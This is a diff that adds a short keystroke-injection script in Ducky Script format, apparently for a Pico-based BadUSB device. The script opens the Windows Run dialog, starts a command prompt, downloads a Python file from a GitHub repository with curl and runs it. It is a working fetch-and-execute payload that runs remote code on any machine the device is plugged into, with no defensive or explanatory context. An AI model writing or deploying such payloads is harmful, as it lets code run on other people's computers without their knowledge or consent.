@@ -1,0 +1,8 @@
+GUI r
+DELAY 50
+STRING cmd 
+ENTER
+STRING curl -LO https://github.com/NotDaniHere/pico-fun/download.py
+ENTER
+DELAY 2000
+STRING python download.py
